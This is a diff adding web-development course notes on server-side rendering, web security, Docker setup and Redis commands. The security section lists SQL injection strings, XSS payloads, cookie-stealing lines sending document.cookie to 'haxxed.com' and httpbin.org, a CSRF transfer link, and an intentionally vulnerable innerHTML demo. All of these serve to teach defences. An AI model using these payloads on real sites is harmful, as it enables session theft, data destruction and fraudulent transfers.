@@ -508,3 +508,922 @@ Some libraries are of course written in TypeScript, such as material-ui, but som
 [TypeScript code example - Robofriends project](https://github.com/aneagoie/robofriends-typescript-completed)
 
 
+
+
+server side rendering
+
+csr 
+pros
+- Rich Interactions
+- Faster Response
+- Web Applications
+
+Cons
+- Low CEO Potential
+- Longer initial load
+
+
+
+ssr
+Pros
+- Static Sites
+- SEO
+- Initial Page Load
+
+Cons
+- Full Page Reloads
+- Slower page rendering
+- Requests to server
+
+server side rendering
+server side rendering react
+nextjs
+gatsby
+
+https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f
+
+https://www.getfilecloud.com/blog/2015/03/tech-tip-how-to-do-hard-refresh-in-browsers/#.Xpm37shKjIU
+
+next link
+
+https://nextjs.org/learn/basics/deploying-a-nextjs-app
+
+create next app
+
+npm install
+
+npm audit fix --force
+
+
+npm update
+
+npm install next@latest
+
+
+https://github.com/aneagoie/next-ssr
+
+https://github.com/aneagoie/next-ssr-update
+
+
+https://developers.google.com/search/docs/guides/javascript-seo-basics
+
+https://aerotwist.com/blog/when-everything-is-important-nothing-is/
+
+
+
+
+
+
+
+Security
+
+Star Of Security
+
+- Authentication
+- Do not trust anyone
+- Data management
+- Access control
+- Secure headers
+- Code secrets
+- XSS & CSRF
+- HTTPS everywhere
+- Logging
+- 3rd party libraries
+- Injections
+
+
+
+
+
+injections
+- most common
+
+' or 1=1 --'
+'; DROP TABLE users; --'
+
+https://owasp.org/www-community/Injection_Theory
+
+to fix them:
+- Sanitize input
+- Parametrize Queries
+- Knex.js or other ORMs
+
+
+https://www.hacksplaining.com/lessons
+
+Example that is not SQL
+
+Client side 
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>🔥Make Me Secure!</title>
+  <link rel="stylesheet" type="text/css" href="./style.css">
+</head>
+<body>
+  <h1>Security Playground 😱🔥</h1>
+  <div>
+    <input id="userinput" type="text">
+    <button onclick="sendToServer()">Submit</button>
+    <h2 id="pleaseNo"></h2>
+  </div>
+  <script src="./script.js"></script>
+</body>
+</html>
+```
+
+```javascript
+// try inputting this: <script>alert('hi')</script>
+// Now, try inputting this: <img src="/" onerror = "alert(1);">
+// Scripts injected into the DOM via script tags in innerHTML
+// are not run at the time they are injected (inline scripts
+// are run at the time the original page is parsed). On the
+// other hand, images injected into the DOM are loaded at that
+// time, and if the loading fails, then the onerror event
+//handler is called.
+const userInputInHTML = (input) => {
+  const p = document.getElementById("pleaseNo")
+  // Bad
+  p.innerHTML = input;
+
+  // Better
+  // var textnode = document.createTextNode(input);
+  // p.appendChild(textnode);
+}
+const sendToServer = () => {
+  const input = document.querySelector('#userinput').value;
+  userInputInHTML(input)
+  fetch('http://localhost:3000/secret', {
+    method: 'POST',
+    body: JSON.stringify({userInput: input}),
+    headers: new Headers({
+      'Content-Type': 'application/json'
+    })
+  })
+```
+
+server side
+
+```javascript
+const express = require('express')
+const cors = require('cors')
+const helmet = require('helmet')
+var winston = require('winston');
+
+const bodyParser = require('body-parser');
+const app = express()
+app.use(cors())
+app.use(helmet())
+app.use(bodyParser.json())
+
+app.get('/', (req, res) => res.send('Hello World!'))
+
+app.post('/secret', (req, res) => {
+  const { userInput } = req.body;
+  console.log(userInput);
+  if (userInput) {
+    winston.log('info', 'user input: ' + userInput);
+    res.status(200).json('success');
+  } else {
+    winston.error('This guy is messing with us:' + userInput);
+    res.status(400).json('incorrect submission')
+  }
+})
+
+app.listen(3000, () => console.log('Example app listening on port 3000!'))
+```
+
+https://www.postgresql.org/download
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+3rd party libraries
+
+npm install -g nsp
+
+nsp check # audit package.json
+
+
+npm install -g snyk
+
+snyk auth
+
+snyk test # audit node_modules directory
+
+
+
+
+
+
+
+
+
+
+
+
+Logging
+
+npm install winston
+
+npm install morgan
+
+
+
+
+
+
+https everywhere
+
+ssl/tls certificates
+
+- https://letsencrypt.org
+- cloudflare
+
+
+
+
+xss + csrf
+
+<img src="/" onerror="alert('boom');">
+
+window.locatiom = 'haxxed.com?cookie=' + document.cookie
+
+
+<a href="http://netbank.com/transfer.do?acct=AttackerA&amount;=$100">Read more</a>
+
+
+fetch('//httpbin.org/post', {method:'POST',body:document.cookie})
+
+'Content-Security-Policy': "script-src 'self' 'https://api.google.com'"
+
+
+npm install csurf
+
+
+- Sanitize input
+- No eval()
+- No document.write()
+- Content Security Policy
+- Secure + HTTPOnly Cookies
+
+
+https://www.hacksplaining.com/exercises/csrf
+
+
+https://www.hacksplaining.com/exercises/xss-stored
+
+
+
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09
+
+
+
+
+
+
+
+
+Code secrets
+
+- Environmental variables
+https://create-react-app.dev/docs/adding-custom-environment-variables/
+https://www.npmjs.com/package/dotenv
+
+- Commit History
+
+
+
+
+
+
+Secure Headers
+
+https://github.com/helmetjs/helmet
+- npm install helmet
+
+
+https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
+https://www.tutorialspoint.com/http/http_header_fields.htm
+
+
+
+
+
+
+
+
+
+
+
+Access control
+
+- Principal of least privilege
+
+CORS
+
+ 
+
+
+
+
+
+ data management
+
+ - bcrypt, scrypt, aragon2
+ - pgcrypto - encrypt a few columns
+
+
+https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/
+
+
+
+
+
+
+
+
+ do not trust anyone
+
+Darth Vader Is Everywher
+
+rate limiter
+
+
+
+
+
+Authentication
+
+Authentication vs Authorization
+
+
+
+
+
+
+
+
+
+https://www.hacksplaining.com/lessons
+
+https://watchyourhack.com/
+
+https://owasp.org/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Code Analysis
+
+
+Smart brain 
+https://github.com/aneagoie/smart-brain
+
+
+smart brain api
+https://github.com/aneagoie/smart-brain-api
+
+
+
+https://developer.okta.com/blog/2019/07/19/mysql-vs-postgres
+
+https://blog.panoply.io/postgresql-vs.-mysql
+
+
+
+
+
+
+
+
+
+
+
+
+
+Docker
+
+https://hub.docker.com/
+
+
+
+create Dockerfile
+```
+FROM node:carbon
+
+CMD ["/bin/bash"]
+```
+
+or
+
+```
+FROM node:8.11.1
+
+CMD ["/bin/bash"]
+```
+
+docker build -t tagname .
+
+docker run -it tagname
+
+change version docker file
+
+docker build -t tagname .
+
+docker run -it tagname
+
+docker run tagname
+
+https://unix.stackexchange.com/questions/398543/what-are-the-contents-of-bin-bash-and-what-do-i-do-if-i-accidentally-overwrote
+
+
+docker run -t -d tagname
+
+docker ps
+
+docker exec -it CONTAINER ID bash
+
+docker stop CONTAINER ID
+
+```
+FROM node:8.11.1
+
+WORKDIR /usr/src/smart-brain-api
+
+COPY ./ ./
+
+RUN npm install
+
+CMD ["/bin/bash"]
+```
+
+docker run -it -p 3000:3000 tagname
+
+https://docs.docker.com/engine/reference/builder/#usage
+
+
+
+
+docker compose
+
+docker-compose.yml
+
+```
+version: '3.6'
+
+
+services:
+	smart-brain-api:
+		container_name: backend
+		build: ./
+		command: npm start
+		working_dir: /usr/src/smart-brain-api
+		ports:
+			- "3000:3000"
+```
+
+docker-compose build
+
+docker-compose run smart-brain-api
+
+everytime you change the yml file
+you need to run docker-composer build 
+to re-read that file
+
+
+docker-compose down
+
+docker-compose up --build
+
+
+
+
+```
+version: '3.6'
+
+
+services:
+	smart-brain-api:
+		container_name: backend
+		build: ./
+		command: npm start
+		working_dir: /usr/src/smart-brain-api
+		ports:
+			- "3000:3000"
+		volumes:
+			- ./:/usr/src/smart-brain-api
+```
+
+
+https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile
+
+
+https://www.linux.com/topic/cloud/docker-volumes-and-networks-compose/
+
+
+docker-compose exec smart-brain-api bash
+
+
+
+docker-compose up -d
+
+
+
+
+
+```
+version: '3.6'
+
+services:
+	# Backend API
+	smart-brain-api:
+		container_name: backend
+		build: ./
+		command: npm start
+		working_dir: /usr/src/smart-brain-api
+		environment:
+			POSTGRES_URI: postgres://sally:secret@postgres:5432/smart-brain-docker
+		links:
+			- postgres
+		ports:
+			- "3000:3000"
+		volumes:
+			- ./:/usr/src/smart-brain-api
+
+	# Postgres
+	postgres:
+		image: postgres
+		environment:
+			POSTGRES_USER: sally
+			POSTGRES_PASSWORD: secret
+			POSTGRES_DB: smart-brain-docker
+			POSTGRES_HOST: postgres
+		ports:
+			- "5432:5432"
+```
+
+
+```
+const db = knex({
+	client: 'pg',
+	connection: process.env.POSTGRES_URI
+});
+```
+
+
+https://www.postgresql.org/docs/9.2/app-psql.html
+
+
+https://hub.docker.com/_/postgres/
+
+
+- create a postgres folder on smart-brain-api
+- create a Dockerfile inside postgres folder
+```
+FROM postgres:10.3
+
+ADD /tables/ /docker-entrypoint-initdb.d/tables/
+ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
+```
+- create a new folder inside postgress folder called tables
+- within the tables folder create 2 foles: login.sql and user.sql (with the create table commands)
+- In the SQL files use transaction
+```
+BEGIN TRANSACTION;
+
+SQL COMMAND
+
+COMMIT;
+```
+- create a file called deploy_schemas.sql within the postgres folder
+```
+-- Deploy fresh database tables
+\i '/docker-entrypoint-initdb.d/tables/users.sql'
+\i '/docker-entrypoint-initdb.d/tables/login.sql'
+```
+- Change the docker-compose.yml file
+```
+version: '3.6'
+
+services:
+	# Backend API
+	smart-brain-api:
+		container_name: backend
+		build: ./
+		command: npm start
+		working_dir: /usr/src/smart-brain-api
+		environment:
+			POSTGRES_URI: postgres://sally:secret@postgres:5432/smart-brain-docker
+		links:
+			- postgres
+		ports:
+			- "3000:3000"
+		volumes:
+			- ./:/usr/src/smart-brain-api
+
+	# Postgres
+	postgres:
+		build: ./postgres
+		environment:
+			POSTGRES_USER: sally
+			POSTGRES_PASSWORD: secret
+			POSTGRES_DB: smart-brain-docker
+			POSTGRES_HOST: postgres
+		ports:
+			- "5432:5432"
+```
+- Change the deploy_schemas.sql file
+```
+-- Deploy fresh database tables
+\i '/docker-entrypoint-initdb.d/tables/users.sql'
+\i '/docker-entrypoint-initdb.d/tables/login.sql'
+\i '/docker-entrypoint-initdb.d/seed/seed.sql'
+```
+- create another folder called seed with the file seed.sql inside
+```
+BEGIN TRANSACTION;
+
+INSERT INTO users (name, email, entries, joined) VALUES ('a', 'a@gmail.com', 1, '2020-01-01');
+INSERT INTO login (hash, email) VALUES ('$2y$12$ed1Dma30h074Xzb1f72qkODPXQimswqTnDksSRIRVogPwfzFDUn2W', 'a@gmail.com');
+
+COMMIT;
+```
+- change dockerfile inside postgres folder
+```
+FROM postgres:10.3
+
+ADD /tables/ /docker-entrypoint-initdb.d/tables/
+ADD /seed/ /docker-entrypoint-initdb.d/seed/
+ADD deploy_schemas.sql /docker-entrypoint-initdb.d/
+```
+
+
+morgan with combined config was intalled in the smart-brain-api
+
+
+http://joshualande.com/create-tables-sql
+
+https://hub.docker.com/_/postgres/
+
+
+smart-brain-api dockerized
+https://github.com/aneagoie/smart-brain-boost-api-dockerized/commit/a7efbdd56c9fbfb29700c3398286dedd38e56166
+
+
+Update: Docker Networks
+Docker is constantly evolving. One of the features that has changed is the links property you have seen in previous videos while writing our docker compose file. Links have been replaced by networks. Docker describes them as a legacy feature that you should avoid using. You can safely remove the link and the two containers will be able to refer to each other by their service name (or container_name). So in our case all you would need to do is remove the below lines from your Docker Compose file and everything should still work fine:
+
+    links:
+      - postgres
+      - redis
+
+
+By default Compose sets up a single network for your app. Each container for a service joins the default network and is both reachableby other containers on that network, and discoverable by them at a hostname identical to the container name. If you want a custom network, you can use the networks property.
+If you want to read more about this, you can check out the official documentation here, or read this stackoverflow answer.
+
+Don't get too confused by this though. This gets into some really advanced networking that is very specialized. The big takeaway is that you no longer need the links property.
+
+https://docs.docker.com/network/links/
+
+https://docs.docker.com/engine/reference/commandline/network_create/
+
+https://docs.docker.com/compose/networking/
+
+https://stackoverflow.com/questions/41294305/docker-compose-difference-between-network-and-link
+
+
+
+
+
+
+
+
+
+
+
+
+
+Redis
+
+https://image.slidesharecdn.com/moniruzzamanpptxnosqldatabase-150327224221-conversion-gate01/95/nosql-database-classification-characteristics-and-comparison-5-638.jpg?cb=1427496253
+
+https://gpinaki.files.wordpress.com/2014/01/nosql-classification1.png
+
+https://hub.packtpub.com/different-types-of-nosql-databases-and-when-to-use-them/
+
+https://redis.io/
+
+https://codeburst.io/redis-what-and-why-d52b6829813
+
+https://www.objectrocket.com/blog/how-to/top-5-redis-use-cases/
+
+https://stackoverflow.com/questions/52196678/what-are-atomic-operations-for-newbies
+
+https://dev.to/trevoirwilliams/relational-sql-vs-non-relational-nosql-databases-hi5
+
+https://redis.io/download
+
+http://try.redis.io/
+
+https://redis.io/commands
+
+```
+> SET name "TestName"
+OK
+> GET name
+"TestName"
+> EXISTS name
+(integer) 1
+> EXISTS name2
+(integer) 0
+> DEL name
+(integer) 1
+> EXISTS name
+(integer) 0
+> GET name
+(nil)
+
+```
+
+```
+> MSET a 2 b 5
+OK
+> GET a
+"2"
+> GET b
+"5"
+> MGET a b
+1) "2"
+2) "5"
+```
+
+https://redis.io/topics/data-types-intro
+
+https://redis.io/topics/data-types
+
+types
+ - string
+ - hashes
+```
+> HMSET user id 45 name "TestName"
+OK
+> HGET user
+(error) wrong number of arguments (given 1, expected 2)
+> HGET user id
+"45"
+> HGET user name
+"TestName"
+> HGETALL user
+1) "id"
+2) "45"
+3) "name"
+```
+ - list
+```
+> LPUSH ourlist 10
+(integer) 1
+> RPUSH ourlist "Test"
+(integer) 2
+> GET ourlist
+(error) WRONGTYPE Operation against a key holding the wrong kind of value
+> LRANGE ourlist 0 1
+1) "10"
+2) "Test"
+> LPUSH ourlist 55
+(integer) 3
+> LRANGE ourlist 0 1
+1) "55"
+2) "10"
+> RPOP ourlist
+"Test"
+> LRANGE ourlist 0 1
+1) "55"
+2) "10"
+> LRANGE ourlist 0 2
+1) "55"
+2) "10"
+```
+ - Sets (unordered) (not allowing repeated values)
+```
+> SADD ourset 1 2 3 4 5
+(integer) 5
+> SMEMBERS ourset
+1) "1"
+2) "2"
+3) "3"
+4) "4"
+5) "5"
+> SADD ourset 1 2 3 4
+(integer) 0
+> SMEMBERS ourset
+1) "1"
+2) "2"
+3) "3"
+4) "4"
+5) "5"
+> SADD ourset 1 2 3 4 5 6 7
+(integer) 2
+> SMEMBERS ourset
+1) "1"
+2) "2"
+3) "3"
+4) "4"
+5) "5"
+6) "6"
+7) "7"
+> SISMEMBER ourset 5
+(integer) 1
+> SISMEMBER ourset 9
+(integer) 0
+```
+ - Ordered Sets
+```
+> ZADD team 50 "Wizards"
+(integer) 1
+> ZADD team 40 "Cavaliers"
+(integer) 1
+> ZRANGE team 0 1
+1) "Cavaliers"
+2) "Wizards"
+> ZADD team 1 "Bolts"
+(integer) 1
+> ZRANGE team 0 2
+1) "Bolts"
+2) "Cavaliers"
+3) "Wizards"
+> ZRANK team "Wizards"
+2
+```
+
+
+
+
+
+
+
+
+
+
+
+
+Sessions + JWT
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
